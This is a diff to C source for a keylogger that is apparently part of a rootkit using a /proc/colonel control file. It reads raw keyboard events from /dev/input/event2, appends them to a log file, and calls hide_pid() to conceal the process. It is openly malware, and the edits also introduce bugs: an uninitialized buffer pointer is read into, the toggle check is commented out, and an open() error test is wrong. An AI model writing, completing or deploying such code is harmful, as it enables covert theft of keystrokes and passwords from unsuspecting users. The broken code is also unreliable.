@@ -97,26 +97,32 @@ int system_timestamp(void) {
 
 int key_listen(void) {
 	int control_file;
-	int input_device;								/* will read from device event file */
-	char listening = 1;								/* toggles keylogger on/off */
-	char cmd[1024];									/* stores commands */
-	char kl[13] = "keylogger: 0";							/* defines what keylogger is listening for on /proc/colonel */
-	char *toggle;									/* listens for keylogger cmd */
-	struct input_event ev;								/* using input_event so we know what we're reading from the event file */
+	int input_device;					/* will read from device event file */
+	char listening = 0;					/* toggles keylogger on/off */
+	char *cmd;						/* stores commands */
+	char *kl = "keylogger: 1";				/* defines what keylogger is listening for on /proc/colonel */
+	char *toggle;						/* listens for keylogger cmd */
+	struct input_event ev;					/* using input_event so we know what we're reading */
 	time_t curtime;
-	time(&curtime);									/* set the current time */
+	time(&curtime);						/* set the current time */
+	
+	input_device = open("/dev/input/event2", O_RDONLY);     /* key event file */
 	
 	while(1) {				
 		fflush(error_log);
 		read(input_device, &ev, sizeof(struct input_event));	                /* read from /dev/input/eventX */
 		control_file = open("/proc/colonel", O_RDONLY);                         /* read from /proc/colonel */
+		if (!control_file) {
+			fprintf(error_log, "ERROR: Could not open control_file -- %s.", ctime(&curtime));
+			exit(1);
+		}
 		read(control_file, cmd, sizeof(cmd));			                /* read from /proc/colonel */
-		toggle = strstr(cmd, kl);				                /* looks for change in /proc/colonel */
-
-		if ((0 == listening) && (toggle != NULL)) {
+		//toggle = strstr(cmd, kl);				                /* looks for change in /proc/colonel */
+		if ((0 == listening) && (toggle)) {
 			listening = !listening;
         		evlog = fopen("./col_log/evlog.txt", "a+");          		/* key log */
-            		if (NULL == evlog) {
+            		printf("evlog: ", evlog);
+			if (NULL == evlog) {
                 		fprintf(error_log, "ERROR: evlog couldn't be opened -- %s", ctime(&curtime));
                 		exit(1);
             		}	
@@ -152,7 +158,6 @@ int main(void) {
 	input_device = open("/dev/input/event2", O_RDONLY);			        /* key event file */
 
 	hide_pid();
-	puts("Now root...");
 	is_root();
 	// findev = open('/proc/bus/input/devices', O_RDONLY);
 	key_listen();	
